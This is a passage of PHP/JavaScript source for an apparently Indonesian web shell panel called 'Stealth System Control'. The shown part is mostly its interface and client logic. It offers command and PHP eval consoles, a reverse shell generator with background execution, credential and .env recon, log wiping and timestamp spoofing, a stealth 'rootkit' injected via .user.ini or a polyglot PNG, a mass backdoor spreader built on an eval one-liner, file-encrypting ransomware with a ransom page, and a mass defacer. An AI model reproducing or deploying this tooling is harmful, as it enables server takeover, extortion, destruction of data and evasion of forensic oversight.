                            <input type='text' name='sql_user' placeholder='User (def: root)' value='$cr_u' style='flex:1; min-width:100px; border:1px dashed #ff00ea; color:#ff00ea;' required>
                            <input type='password' name='sql_pass' placeholder='Password' value='$cr_p' style='flex:1; min-width:100px; background:transparent; border:1px dashed #ff00ea; color:#ff00ea; outline:none; font-family:inherit; padding:8px;'>
                            <input type='text' name='sql_db' placeholder='DB Name (Optional)' value='$cr_d' style='flex:1; min-width:100px; border:1px dashed #ff00ea; color:#ff00ea;'>
                        </div>
                        <textarea name='sql_query' id='sql_input' class='editor-area cmd-scroll' style='min-height:150px; background:#111; color:#ff00ea; border:1px dashed #ff00ea;' placeholder='SHOW DATABASES;' required " . ($open_cmd_modal && $cmd_title === "SQL MANAGER RESULT" ? "autofocus" : "") . "></textarea>
                        <button type='submit' style='width:100%; background:#ff00ea; color:#fff;'>EXECUTE SQL QUERY</button>
                    </form>
                </div>

                <!-- SCAN Form -->
                <div id='tool_scan' style='display:$scan_form_display;'>
                    <form method='post' style='display:flex; flex-direction:column; gap:15px; margin:0;'>
                        <label style='color:#bbb;'>Network Port Scanner: <b>(TCP Scan)</b></label>
                        <div style='display:flex; flex-wrap:wrap; gap:10px; width:100%; box-sizing:border-box;'>
                            <input type='text' name='scan_ip' id='scan_input' placeholder='Target IP / Domain (e.g. 127.0.0.1)' value='127.0.0.1' style='flex:1; min-width:150px; border:1px dashed #00ffff; color:#00ffff;' required " . ($open_cmd_modal && $cmd_title === "NETWORK SCANNER RESULT" ? "autofocus" : "") . ">
                        </div>
                        <input type='text' name='scan_ports' placeholder='Ports (e.g. 21,22,80,443,3306)' value='21,22,23,25,53,80,110,135,139,443,445,3306,3389' style='width:100%; border:1px dashed #00ffff; color:#00ffff;' required>
                        <button type='submit' style='width:100%; background:#00ffff; color:#000; font-weight:bold;'>START SCAN TARGET</button>
                    </form>
                </div>

                <!-- UPLOAD Form -->
                <div id='tool_upload' style='display:none;'>
                    <form method='post' enctype='multipart/form-data' style='display:flex; flex-direction:column; gap:15px; margin:0;'>
                        <label style='color:#bbb;'>Target Dir: <b>$display_path</b></label>
                        <input type='file' name='fileToUpload' required style='margin:0; width:100%; cursor:pointer;'>
                        <button type='submit' name='submit' style='width:100%;'>UPLOAD NOW</button>
                    </form>
                </div>

                <!-- CREATE Form -->
                <div id='tool_create' style='display:none;'>
                    <form method='post' style='display:flex; flex-direction:column; gap:15px; margin:0;'>
                        <label style='color:#bbb;'>Target Dir: <b>$display_path</b></label>
                        <div style='display:flex; align-items:center; gap:10px; width:100%; box-sizing:border-box;'>
                            <input type='text' name='new_item_name' id='create_input' placeholder='Name...' required style='flex-grow:1; margin:0; min-width:0;'>
                            <select name='item_type' class='inline-select' style='padding:8px; font-size:14px; border:1px dashed #00ff00; height:auto; color: #00ff00; background: #111; margin:0;'>
                                <option value='file'>File</option>
                                <option value='dir'>Folder</option>
                            </select>
                        </div>
                        <button type='submit' style='width:100%;'>CREATE ITEM</button>
                    </form>
                </div>

                <!-- ARCHIVE Form -->
                <div id='tool_archive' style='display:none;'>
                    <form method='post' style='display:flex; flex-direction:column; gap:15px; margin:0;'>
                        <label style='color:#bbb;'>Target Dir: <b>$display_path</b></label>
                        <input type='hidden' name='zip_dir' value='" . htmlspecialchars($dir_real, ENT_QUOTES) . "'>
                        <input type='text' name='zip_name' id='archive_input' placeholder='backup_name.zip' required style='margin:0; width:100%;'>
                        <button type='submit' style='width:100%;'>COMPRESS NOW</button>
                    </form>
                </div>

                <!-- REVERSE SHELL Form -->
                <div id='tool_rs' style='display:$rs_form_display;'>
                    <form method='post' style='display:flex; flex-direction:column; gap:15px; margin:0;'>
                        <label style='color:#bbb;'>Reverse Shell Payload Generator</label>
                        <div style='display:flex; flex-wrap:wrap; gap:10px; width:100%; box-sizing:border-box;'>
                            <input type='text' name='rs_ip' id='rs_input' placeholder='Your IP / Attack IP' style='flex:1; min-width:150px; border:1px dashed #ff4444; color:#ff4444;' required " . ($open_cmd_modal && $cmd_title === "REVERSE SHELL GENERATOR" ? "autofocus" : "") . ">
                            <input type='number' name='rs_port' placeholder='Port (e.g 4444)' value='4444' style='width:100px; background:transparent; border:1px dashed #ff4444; color:#ff4444; padding:8px;' required>
                            <select name='rs_type' style='font-size:14px; padding:8px; border:1px dashed #ff4444; background:#111; color:#ff4444; outline:none;'>
                                <option value='bash'>Bash</option>
                                <option value='python'>Python</option>
                                <option value='python3'>Python 3</option>
                                <option value='nc'>Netcat</option>
                                <option value='php'>PHP</option>
                                <option value='perl'>Perl</option>
                            </select>
                        </div>
                        <label style='display:flex; align-items:center; color:#ff4444; gap:10px;'>
                            <input type='checkbox' name='rs_exec' value='1'> Execute immediately in background?
                        </label>
                        <button type='submit' style='width:100%; background:#ff4444; color:#fff; font-weight:bold;'>GENERATE / EXECUTE</button>
                    </form>
                </div>

                <!-- RECON Form -->
                <div id='tool_recon' style='display:$recon_form_display;'>
                    <form method='post' style='display:flex; flex-direction:column; gap:15px; margin:0;'>
                        <label style='color:#bbb;'>Auto Reconnaissance: <b>Find .env, configs, system info</b></label>
                        <input type='hidden' name='auto_recon' value='1'>
                        <button type='submit' style='width:100%; background:#00ffff; color:#000; font-weight:bold;'>START RECON (MIGHT TAKE A WHILE)</button>
                    </form>
                </div>

                <!-- DEFENSE Form -->
                <div id='tool_defense' style='display:$defense_form_display;'>
                    <form method='post' style='display:flex; flex-direction:column; gap:15px; margin:0;'>
                        <label style='color:#bbb;'>Self-Defense & Anti-Forensic Protocol:</label>
                        <ul style='color:#ffaa00; font-size:12px; margin:0 0 10px 15px; padding:0;'>
                            <li>Spoof File Timestamp (match <code>index.php</code>)</li>
                            <li>Wipe Server Activity Logs (Linux)</li>
                            <li>Inject Fake Server Response Headers (IIS/ASP)</li>
                        </ul>
                        <input type='hidden' name='self_defense' value='1'>
                        <button type='submit' style='width:100%; background:#ff0088; color:#fff; font-weight:bold; border:1px solid #ffaa00;'>ACTIVATE SELF-DEFENSE</button>
                    </form>
                </div>

                <!-- GHOST ROOTKIT Form -->
                <div id='tool_ghost' style='display:$ghost_form_display;'>
                    <form method='post' style='display:flex; flex-direction:column; gap:15px; margin:0;'>
                        <label style='color:#00ff00;'><b>[☢] Ghost Rootkit (100% Stealth & FUD Bypass):</b></label>
                        <ul style='color:#bbb; font-size:12px; margin:0 0 10px 15px; padding:0; line-height: 1.6;'>
                            <li><b>[1] .user.ini Mode:</b> Auto-injects payload to all PHP without editing them physically.</li>
                            <li><b>[2] Polyglot Image:</b> Bypasses Firewalls by uploading a fake <code>.png</code> executing as PHP via <code>.htaccess</code>.</li>
                            <li><i><span style='color:#ffaa00;'>No trace left behind. Executed strictly via Header X-Ghost.</span></i></li>
                        </ul>
                        <input type='hidden' name='ghost_rootkit' value='1'>
                        <select name='ghost_type' style='font-size:14px; padding:10px; border:1px dashed #00ff00; background:#111; color:#00ff00; outline:none;'>
                            <option value='user_ini'>1. Inject via hidden .user.ini (Auto-Prepend)</option>
                            <option value='htaccess_png'>2. Inject Polyglot Payload (avatar.png via .htaccess)</option>
                        </select>
                        <button type='submit' style='width:100%; background:#00ff00; color:#000; font-weight:bold; border:1px solid #fff; box-shadow:0 0 10px rgba(0,255,0,0.5);'>DEPLOY GHOST ROOTKIT MALEWARE</button>
                    </form>
                </div>

                <!-- PROC MGR Form -->
                <div id='tool_proc' style='display:$proc_form_display;'>
                    <form method='post' style='display:flex; flex-direction:column; gap:15px; margin:0;'>
                        <label style='color:#bbb;'>Advanced Process Manager (Taskmgr / ps aux):</label>
                        <input type='hidden' name='proc_mgr' value='1'>
                        <div style='display:flex; flex-wrap:wrap; gap:10px; width:100%; box-sizing:border-box;'>
                            <input type='number' name='kill_pid' placeholder='PID to Kill (Optional)' style='flex:1; min-width:150px; background:transparent; border:1px dashed #ffff00; color:#ffff00; padding:8px;' " . ($open_cmd_modal && $cmd_title === "PROCESS MANAGER" ? "autofocus" : "") . ">
                            <button type='submit' style='background:#ffff00; color:#000; font-weight:bold;'>FETCH / EXECUTE</button>
                        </div>
                    </form>
                </div>

                <!-- INJECTOR Form -->
                <div id='tool_inject' style='display:$inject_form_display;'>
                    <form method='post' style='display:flex; flex-direction:column; gap:15px; margin:0;'>
                        <label style='color:#bbb;'>Auto Persistence Injector (Mass Backdoor Spreader):</label>
                        <input type='hidden' name='inject_mgr' value='1'>
                        <div style='display:flex; flex-wrap:wrap; gap:10px; width:100%; box-sizing:border-box;'>
                            <input type='text' name='inj_dir' placeholder='Target Directory' value='" . htmlspecialchars($dir_real, ENT_QUOTES) . "' style='flex:1; min-width:150px; background:transparent; border:1px dashed #bb88ff; color:#bb88ff; padding:8px;' required>
                            <input type='text' name='inj_files' placeholder='Target Files/Ext (e.g., index.php, php, txt)' value='index.php, default.php' style='flex:1; min-width:150px; background:transparent; border:1px dashed #bb88ff; color:#bb88ff; padding:8px;' required>
                        </div>
                        <textarea name='inj_payload' class='editor-area cmd-scroll' style='min-height:100px; background:#111; color:#bb88ff; border:1px dashed #bb88ff;' placeholder='&lt;?php @eval(\$_POST[\'x\']); ?&gt;' required " . ($open_cmd_modal && $cmd_title === "PERSISTENCE INJECTOR" ? "autofocus" : "") . "></textarea>
                        <button type='submit' style='background:#bb88ff; color:#000; font-weight:bold;'>SPREAD PAYLOAD</button>
                    </form>
                </div>

                <!-- RANSOMWARE Form -->
                <div id='tool_ransomware' style='display:$ransom_form_display;'>
                    <form method='post' style='display:flex; flex-direction:column; gap:15px; margin:0;'>
                        <label style='color:#ff0000; font-weight:bold;'>Ransomware Master (Encrypt / Decrypt System):</label>
                        <ul style='color:#bbb; font-size:12px; margin:0 0 10px 15px; padding:0; line-height: 1.6;'>
                            <li><b>HATI-HATI:</b> Kunci (Password) jangan sampai lupa atau file bakal lenyap permanen.</li>
                            <li>Bisa target spesifik 1 nama file ATAU target folder (Otomatis Massal).</li>
                            <li>Data akan diubah ke Base64-XOR dan berakhiran ekstensi <code>.locked</code>.</li>
                        </ul>
                        <div style='display:flex; flex-wrap:wrap; gap:10px; width:100%; box-sizing:border-box;'>
                            <input type='text' name='ransom_target' placeholder='Target File/Folder' value='" . htmlspecialchars($dir_real, ENT_QUOTES) . "' style='flex:1; min-width:150px; background:transparent; border:1px dashed #ff0000; color:#ff0000; padding:8px;' required>
                            <input type='text' name='ransom_key' placeholder='Secret Password Key' style='flex:1; min-width:150px; background:transparent; border:1px dashed #ff0000; color:#ff0000; padding:8px;' required>
                        </div>
                        <div style='display:flex; flex-wrap:wrap; gap:10px; align-items:center;'>
                            <select name='ransom_action' style='flex:1; font-size:14px; padding:8px; border:1px dashed #ff0000; background:#111; color:#ff0000; outline:none;'>
                                <option value='encrypt'>Mode: ENCRYPT (Lock)</option>
                                <option value='decrypt'>Mode: DECRYPT (Unlock)</option>
                            </select>
                            <label style='display:flex; align-items:center; color:#ff0000; gap:5px; flex:1;'>
                                <input type='checkbox' name='ransom_note' value='1' checked> Deploy Template Ransom Page?
                            </label>
                        </div>
                        <button type='submit' style='width:100%; background:#ff0000; color:#fff; font-weight:bold; border:1px solid #fff; box-shadow:0 0 10px rgba(255,0,0,0.5);'>EXECUTE RANSOMWARE</button>
                    </form>
                </div>

                <!-- DEFACER Form -->
                <div id='tool_deface' style='display:$deface_form_display;'>
                    <form method='post' style='display:flex; flex-direction:column; gap:15px; margin:0;'>
                        <label style='color:#bbb;'>Auto Defacer (Mass Deface Index Finder):</label>
                        <input type='hidden' name='auto_deface' value='1'>
                        <div style='display:flex; flex-wrap:wrap; gap:10px; width:100%; box-sizing:border-box;'>
                            <input type='text' name='def_dir' placeholder='Target Directory' value='" . htmlspecialchars($dir_real, ENT_QUOTES) . "' style='flex:1; min-width:150px; background:transparent; border:1px dashed #ff0000; color:#ff0000; padding:8px;' required>
                        </div>
                        <textarea name='def_payload' class='editor-area cmd-scroll' style='min-height:150px; background:#111; color:#ff0000; border:1px dashed #ff0000;' placeholder='&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hacked By YOU&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;' required " . ($open_cmd_modal && $cmd_title === "AUTO DEFACER RESULT" ? "autofocus" : "") . "></textarea>
                        <button type='submit' style='background:#ff0000; color:#fff; font-weight:bold;'>BRUTAL DEFACE MODE</button>
                    </form>
                </div>

            </div>
            <div class='modal-footer' style='justify-content: flex-end;'>
                <span class='btn-cancel' onclick='closeToolModal()' style='padding:8px 20px; font-weight:bold; cursor:pointer;'>CLOSE</span>
            </div>
        </div>
      </div>";

// Floating Action Buttons (Translator + Back to Top)
echo "<div class='float-container'>
        <div id='google_translate_element'></div>
        <button class='float-btn' id='btn_translate' title='Translate Google' onclick='toggleTranslate()' onmouseover=\"setHud('<b style=\'color:#00bfff;\'>[🌐] TRANSLATOR</b>: Modul Google Translate otomatis. Klik untuk memunculkan pilihan daftar bahasa negara dan panel akan langsung diterjemahkan.')\" onmouseout='resetHud()'>🌐</button>
        <button class='float-btn' id='btn_totop' title='Back To Top' onclick='window.scrollTo({top:0, behavior:\"smooth\"})'>▲</button>
      </div>";

// Footer Section
echo "<div style='margin-top: 50px; padding: 25px; border-top: 1px dashed #333; background: #111; text-align: center; font-family: Consolas, \"Courier New\", monospace; line-height: 1.6; margin-bottom: 20px;'>
        <div style='color: #ccc; font-size: 14px;'>
            <span style='color: #00ff00; font-weight:bold;'>root@stealth</span><span style='color: #aaa;'>:~#</span> cat /etc/copyright
            <br>
            <strong style='color: #fff;'>&copy; " . date('Y') . " Stealth System Control</strong>
        </div>
        <div style='color: #ccc; font-size: 14px; margin-top: 15px;'>
            <span style='color: #00ff00; font-weight:bold;'>root@stealth</span><span style='color: #aaa;'>:~#</span> whoami
            <br>
            <span style='color: #00bfff; font-weight: bold; letter-spacing: 2px; font-size: 16px; text-shadow: 0 0 5px rgba(0,191,255,0.5);'>DENOYEY</span>
        </div>
        <div style='color: #eee; font-size: 14px; margin-top: 25px; font-style: italic; font-family: Arial, sans-serif; letter-spacing: 0.5px;'>
            \"Menulislah dengan kode, biarkan sistem yang bercerita. Bekerjalah dalam senyap, biarkan karyamu mengguncang dunia.\"
        </div>
      </div>";

echo "</div>
<script>
    let isModalOpen = " . ((isset($_GET['edit']) || isset($_GET['view']) || isset($_GET['rename']) || isset($_GET['chmod']) || isset($_GET['hash']) || isset($_GET['copy']) || isset($_GET['move']) || $open_cmd_modal) ? 'true' : 'false') . ";
    let blockRefresh = isModalOpen;
    const rtBadge = document.getElementById('rt_badge');
    
    function toggleSelectAll(source) {
        let checkboxes = document.querySelectorAll('.item-check');
        for (let i = 0; i < checkboxes.length; i++) {
            checkboxes[i].checked = source.checked;
        }
    }

    // Auto-clean URL History & Modal Close Handler
    if(window.history.replaceState) {
        let cleanUrl = window.location.protocol + '//' + window.location.host + window.location.pathname;
        let prm = new URLSearchParams(window.location.search);
        let hasDir = prm.has('dir');
        let currentDir = prm.get('dir');
        let newUrl = cleanUrl + (hasDir ? '?dir=' + encodeURIComponent(currentDir) : '');
        
        // Handle cancel / close logic without reloading
        document.querySelectorAll('.modal-close, .btn-cancel').forEach(el => {
            el.addEventListener('click', function(e) {
                // Prevent full page reload on Cancel for PHP-rendered anchor tags
                if (this.tagName === 'A') {
                    e.preventDefault(); 
                    let modal = this.closest('.modal-overlay');
                    if (modal) {
                        modal.style.display = 'none';
                    }
                    isModalOpen = false;
                    blockRefresh = false;
                    updateRTIndicator();
                }
                
                // Clean URL state on close
                window.history.replaceState({path: newUrl}, '', newUrl);
            });
        });
    }

    // Auto-scroll cmd result if present
    setTimeout(() => {
        let cmdResult = document.getElementById('cmd_result_text');
        if(cmdResult) cmdResult.scrollTop = cmdResult.scrollHeight;
    }, 100);
    
    // HUD Info Display logic for modern user-friendly experience
    function setHud(text) {
        let hudBox = document.getElementById('hud_info');
        let hudText = document.getElementById('hud_text');
        if(hudBox && hudText) {
            hudText.innerHTML = text;
            hudBox.style.borderColor = '#00ff00';
            hudBox.style.boxShadow = 'inset 0 0 10px rgba(0,255,0,0.1)';
        }
    }
    
    function resetHud() {
        let hudBox = document.getElementById('hud_info');
        let hudText = document.getElementById('hud_text');
        if(hudBox && hudText) {
            hudText.innerHTML = \"<span style='color:#00ff00;'>Arahkan kursor Anda ke deretan tombol menu maupun action file untuk melihat Penjelasan (Tutorial) cara pemakaian secara otomatis di area ini.</span>\";
            hudBox.style.borderColor = '#00bfff';
            hudBox.style.boxShadow = 'inset 0 0 10px rgba(0,191,255,0.1)';
        }
    }

    // Tools logic
    function openToolModal(toolName) {
        document.getElementById('tools_modal').style.display = 'flex';
        document.getElementById('tool_cmd').style.display = 'none';
        document.getElementById('tool_eval').style.display = 'none';
        if(document.getElementById('tool_sql')) document.getElementById('tool_sql').style.display = 'none';
        if(document.getElementById('tool_scan')) document.getElementById('tool_scan').style.display = 'none';
        document.getElementById('tool_upload').style.display = 'none';
        document.getElementById('tool_create').style.display = 'none';
        document.getElementById('tool_archive').style.display = 'none';
        if(document.getElementById('tool_rs')) document.getElementById('tool_rs').style.display = 'none';
        if(document.getElementById('tool_recon')) document.getElementById('tool_recon').style.display = 'none';
        if(document.getElementById('tool_defense')) document.getElementById('tool_defense').style.display = 'none';
        if(document.getElementById('tool_ghost')) document.getElementById('tool_ghost').style.display = 'none';
        if(document.getElementById('tool_proc')) document.getElementById('tool_proc').style.display = 'none';
        if(document.getElementById('tool_inject')) document.getElementById('tool_inject').style.display = 'none';
        if(document.getElementById('tool_deface')) document.getElementById('tool_deface').style.display = 'none';
        if(document.getElementById('tool_ransomware')) document.getElementById('tool_ransomware').style.display = 'none';
        
        let resBlock = document.getElementById('cmd_result');
        if(resBlock) resBlock.style.display = 'none';
        
        blockRefresh = true;
        updateRTIndicator();

        if(toolName === 'cmd') {
            document.getElementById('tools_modal_title').innerText = '>> COMMAND EXECUTION';
            document.getElementById('tool_cmd').style.display = 'block';
            document.getElementById('cmd_input').focus();
        } else if(toolName === 'eval') {
            document.getElementById('tools_modal_title').innerText = '>> PHP EVAL CONSOLE';
            document.getElementById('tool_eval').style.display = 'block';
            document.getElementById('eval_input').focus();
        } else if(toolName === 'sql') {
            document.getElementById('tools_modal_title').innerText = '>> SQL DB EXPLORER';
            document.getElementById('tool_sql').style.display = 'block';
            document.getElementById('sql_input').focus();
        } else if(toolName === 'scan') {
            document.getElementById('tools_modal_title').innerText = '>> NETWORK PORT SCANNER';
            document.getElementById('tool_scan').style.display = 'block';
            document.getElementById('scan_input').focus();
        } else if(toolName === 'upload') {
            document.getElementById('tools_modal_title').innerText = '>> FILE UPLOADER';
            document.getElementById('tool_upload').style.display = 'block';
        } else if(toolName === 'create') {
            document.getElementById('tools_modal_title').innerText = '>> CREATE NEW ITEM';
            document.getElementById('tool_create').style.display = 'block';
            document.getElementById('create_input').focus();
        } else if(toolName === 'archive') {
            document.getElementById('tools_modal_title').innerText = '>> ARCHIVE CURRENT FOLDER (ZIP)';
            document.getElementById('tool_archive').style.display = 'block';
            document.getElementById('archive_input').focus();
        } else if(toolName === 'rs') {
            document.getElementById('tools_modal_title').innerText = '>> REVERSE SHELL GENERATOR';
            document.getElementById('tool_rs').style.display = 'block';
            document.getElementById('rs_input').focus();
        } else if(toolName === 'recon') {
            document.getElementById('tools_modal_title').innerText = '>> AUTO RECONNAISSANCE';
            document.getElementById('tool_recon').style.display = 'block';
        } else if(toolName === 'defense') {
            document.getElementById('tools_modal_title').innerText = '>> SELF-DEFENSE & ANTI-FORENSIC';
            document.getElementById('tool_defense').style.display = 'block';
        } else if(toolName === 'ghost') {
            document.getElementById('tools_modal_title').innerText = '>> GHOST ROOTKIT (FUD & BYPASS)';
            document.getElementById('tool_ghost').style.display = 'block';
        } else if(toolName === 'proc') {
            document.getElementById('tools_modal_title').innerText = '>> PROCESS MANAGER';
            document.getElementById('tool_proc').style.display = 'block';
        } else if(toolName === 'inject') {
            document.getElementById('tools_modal_title').innerText = '>> PERSISTENCE INJECTOR';
            document.getElementById('tool_inject').style.display = 'block';
        } else if(toolName === 'ransomware') {
            document.getElementById('tools_modal_title').innerText = '>> RANSOMWARE PROTOCOL';
            document.getElementById('tool_ransomware').style.display = 'block';
        } else if(toolName === 'deface') {
            document.getElementById('tools_modal_title').innerText = '>> AUTO DEFACER';
            document.getElementById('tool_deface').style.display = 'block';
        }
    }

    function closeToolModal() {
        document.getElementById('tools_modal').style.display = 'none';
        // Only keep blockRefresh if an SPA file modal is still open
        let spaOpen = !!document.getElementById('_spa_modal');
        if (!spaOpen) {
            isModalOpen = false;
            blockRefresh = false;
            updateRTIndicator();
        }
    }

    function updateRTIndicator() {
        if(!rtBadge) return;
        if(blockRefresh) {
            rtBadge.innerText = 'REALTIME: PAUSED';
            rtBadge.style.color = '#ffaa00';
            rtBadge.style.borderColor = '#ffaa00';
            rtBadge.style.textShadow = '0 0 3px #ffaa00';
            rtBadge.style.boxShadow = '0 0 5px rgba(255,170,0,0.3)';
        } else {
            rtBadge.innerText = 'REALTIME: ON';
            rtBadge.style.color = 'lime';
            rtBadge.style.borderColor = 'lime';
            rtBadge.style.textShadow = '0 0 3px lime';
            rtBadge.style.boxShadow = '0 0 5px rgba(0,255,0,0.3)';
        }
    }

    document.addEventListener('focus', function(e) {
        if(['INPUT', 'TEXTAREA', 'SELECT'].includes(e.target.tagName)) {
            blockRefresh = true;
            updateRTIndicator();
        }
    }, true);

    document.addEventListener('blur', function(e) {
        // Only release blockRefresh if no modal (tools, SPA file modal) is open
        let spaOpen = !!document.getElementById('_spa_modal');
        let toolsOpen = document.getElementById('tools_modal') &&
                        document.getElementById('tools_modal').style.display !== 'none';
        if (!isModalOpen && !spaOpen && !toolsOpen) {
            blockRefresh = false;
            updateRTIndicator();
        }
    }, true);

    // AbortController to prevent race conditions in RT fetch
    let _rtAbortCtrl = null;
    setInterval(function(){
        if(blockRefresh) return;
        
        // Abort previous in-flight fetch if still pending
        if (_rtAbortCtrl) _rtAbortCtrl.abort();
        _rtAbortCtrl = new AbortController();
        
        let url = new URL(window.location.href);
        fetch(url.href, { signal: _rtAbortCtrl.signal })
        .then(r => r.text())
        .then(html => {
            // Double-check: don't update if modal opened during fetch
            if (blockRefresh) return;
            let parser = new DOMParser();
            let doc = parser.parseFromString(html, 'text/html');
            
            let oldTbl = document.querySelector('.table-responsive table');
            let newTbl = doc.querySelector('.table-responsive table');
            if(oldTbl && newTbl) oldTbl.innerHTML = newTbl.innerHTML;
            
            let oldSys = document.querySelector('.sys-info');
            let newSys = doc.querySelector('.sys-info');
            if(oldSys && newSys) {
                oldSys.innerHTML = newSys.innerHTML;
                updateClientTime();
                let rt_load = newSys.querySelector('#rt_load_data');
                if (rt_load && document.getElementById('rt_load')) {
                   document.getElementById('rt_load').innerHTML = rt_load.innerHTML;
                }
            }
        }).catch(err => {
            if (err.name !== 'AbortError') console.log('RT Error:', err);
        });
    }, 2500);

    function updateClientTime() {
        const timeEl = document.getElementById('client_time');
        if(timeEl) {
            const now = new Date();
            const pad = (n) => n.toString().padStart(2, '0');
            const formatStr = now.getFullYear() + '-' + pad(now.getMonth() + 1) + '-' + pad(now.getDate()) + ' ' + 
                              pad(now.getHours()) + ':' + pad(now.getMinutes()) + ':' + pad(now.getSeconds());
            
            let tz = '';
            try { tz = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e) {}
            
            timeEl.innerText = formatStr + (tz ? ' (' + tz + ')' : '');
        }
    }

    updateRTIndicator();
    updateClientTime();
    setInterval(updateClientTime, 1000);

    // Toggle Translate Box
    function toggleTranslate() {
        let tr = document.getElementById('google_translate_element');
        tr.style.display = (tr.style.display === 'none' || tr.style.display === '') ? 'block' : 'none';
        blockRefresh = (tr.style.display === 'block') ? true : isModalOpen; // Pause refresh if translating
        updateRTIndicator();
    }
    
    // Auto Show/Hide BackToTop Button
    window.onscroll = function() {
        let topBtn = document.getElementById('btn_totop');
        if (document.body.scrollTop > 300 || document.documentElement.scrollTop > 300) {
            topBtn.style.display = 'flex';
        } else {
            topBtn.style.display = 'none';
        }
    };
</script>
<script type='text/javascript'>
function googleTranslateElementInit() {
  new google.translate.TranslateElement({pageLanguage: 'id', layout: google.translate.TranslateElement.InlineLayout.SIMPLE}, 'google_translate_element');
}
</script>
<script type='text/javascript' src='//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit'></script>

<!-- Form for Mass Action submission -->
<form id='mass_action_form' method='post' action='?dir=" . urlencode($dir_real) . "' style='display:none;'>
    <input type='hidden' name='mass_action' id='mass_action_type'>
    <input type='hidden' name='mass_items' id='mass_action_items'>
    <input type='hidden' name='mass_param1' id='mass_action_param1'>
</form>
";
?>
<?php
$_dir_js = json_encode($dir_real);
$_sep_js = json_encode(DIRECTORY_SEPARATOR);
?>
<script>
    function executeAction(action) {
        let checkboxes = document.querySelectorAll('.item-check:checked');
        if (checkboxes.length === 0) {
            alert('Tidak ada item yang dipilih (No items selected).\nSilakan beri centang pada kotak di samping nama file/folder terlebih dahulu.');
            return;
        }

        // Single-item only via SPA modal: view, edit, rename, hash, chmod
        const fetchModalActions = ['view', 'edit', 'rename', 'hash', 'chmod'];
        // copy & move: single item → SPA modal, multi item → mass action (prompt)
        const copyMoveActions = ['copy', 'move'];
        // Always needs real server navigation
        const navActions = ['download', 'unzip'];
        const strictSingleActions = [...fetchModalActions, ...navActions];

        let dirReal = <?php echo $_dir_js; ?>;
        let sep = <?php echo $_sep_js; ?>;

        // ---- Handle copy / move: single → SPA modal, multiple → prompt+mass ----
        if (copyMoveActions.includes(action)) {
            if (checkboxes.length === 1) {
                // Single item: open SPA modal
                let selectedItem = checkboxes[0];
                let fileName = selectedItem.value;
                let fullPath = dirReal + (dirReal.endsWith('/') || dirReal.endsWith('\\') ? '' : sep) + fileName;
                let url = '?dir=' + encodeURIComponent(dirReal) + '&' + action + '=' + encodeURIComponent(fullPath);
                openFetchedModal(url, dirReal);
                return;
            } else {
                // Multiple items: mass action with destination prompt
                let selectedItems = [];
                checkboxes.forEach(cb => selectedItems.push(cb.value));
                let param1 = prompt('Masukkan FULL PATH folder tujuan (Destination Dir) untuk ' + checkboxes.length + ' item:', dirReal);
                if (param1 === null) return;
                document.getElementById('mass_action_type').value = action;
                document.getElementById('mass_action_items').value = selectedItems.join('|||');
                document.getElementById('mass_action_param1').value = param1;
                document.getElementById('mass_action_form').submit();
                return;
            }
        }

        // ---- Handle strictly single-item actions (SPA modal or nav) ----
        if (strictSingleActions.includes(action)) {
            if (checkboxes.length > 1) {
                alert('Aksi [' + action.toUpperCase() + '] hanya bisa dilakukan pada SATU file atau folder sekaligus.\nHarap kurangi centang hingga hanya 1 item yang terpilih.');
                return;
            }

            let selectedItem = checkboxes[0];
            let fileName = selectedItem.value;
            let isDir = selectedItem.getAttribute('data-is-dir') === '1';
            let fullPath = dirReal + (dirReal.endsWith('/') || dirReal.endsWith('\\') ? '' : sep) + fileName;

            if (isDir && ['view', 'edit', 'hash', 'download', 'unzip'].includes(action)) {
                alert('Aksi [' + action.toUpperCase() + '] tidak bisa digunakan pada folder / direktori.');
                return;
            }

            let url = '?dir=' + encodeURIComponent(dirReal) + '&' + action + '=' + encodeURIComponent(fullPath);

            if (fetchModalActions.includes(action)) {
                openFetchedModal(url, dirReal);
                return;
            }

            // Download & unzip: real navigation
            window.location.href = url;
            return;
        }

        // ---- Mass actions: delete, chmod, ransom_enc, ransom_dec ----
        let selectedItems = [];
        checkboxes.forEach(cb => selectedItems.push(cb.value));
        let itemsStr = selectedItems.join('|||');
        let param1 = '';

        if (action === 'delete') {
            if (!confirm('PERINGATAN! Anda akan menghapus ' + checkboxes.length + ' item secara massal dan permanen. Yakin?')) {
                return;
            }
        } else if (action === 'chmod') {
            param1 = prompt('Masukkan nilai CHMOD (contoh: 0777 atau 0644):', '0755');
            if (param1 === null) return;
        } else if (action === 'ransom_enc' || action === 'ransom_dec') {
            param1 = prompt('PERHATIAN! Mode Mass Ransomware.\nMasukkan Password/Kunci rahasia Anda:', 'MySekret1337');
            if (param1 === null || param1.trim() === '') {
                alert('Password/Key tidak boleh kosong!');
                return;
            }
        }

        document.getElementById('mass_action_type').value = action;
        document.getElementById('mass_action_items').value = itemsStr;
        document.getElementById('mass_action_param1').value = param1;
        document.getElementById('mass_action_form').submit();
    }

    // -------------------------------------------------------
    // SPA Modal Loader: fetch modal HTML, inject, no reload
    // -------------------------------------------------------
    function openFetchedModal(url, dirReal) {
        isModalOpen = true;
        blockRefresh = true;
        updateRTIndicator();

        document.body.style.cursor = 'wait';

        fetch(url, { credentials: 'same-origin' })
            .then(r => r.text())
            .then(html => {
                document.body.style.cursor = '';

                let parser = new DOMParser();
                let doc = parser.parseFromString(html, 'text/html');
                let newModal = doc.querySelector('.modal-overlay');

                if (!newModal) {
                    isModalOpen = false;
                    blockRefresh = false;
                    updateRTIndicator();
                    return;
                }

                let old = document.getElementById('_spa_modal');
                if (old) old.remove();

                newModal.id = '_spa_modal';
                newModal.style.animation = 'none';

                function closeModal(e) {
                    if (e) e.preventDefault();
                    let m = document.getElementById('_spa_modal');
                    if (m) {
                        m.style.opacity = '0';
                        m.style.transition = 'opacity 0.15s';
                        setTimeout(() => { if (m) m.remove(); }, 150);
                    }
                    isModalOpen = false;
                    blockRefresh = false;
                    updateRTIndicator();
                    let base = window.location.pathname;
                    let dir = new URLSearchParams(window.location.search).get('dir');
                    history.replaceState(null, '', base + (dir ? '?dir=' + encodeURIComponent(dir) : ''));
                }

                newModal.querySelectorAll('.btn-cancel, .modal-close').forEach(btn => {
                    btn.addEventListener('click', closeModal);
                });
                newModal.addEventListener('click', function (e) {
                    if (e.target === newModal) closeModal(e);
                });

                document.body.appendChild(newModal);

                setTimeout(() => {
                    let focusEl = newModal.querySelector('textarea, input[type=text], input[type=number]');
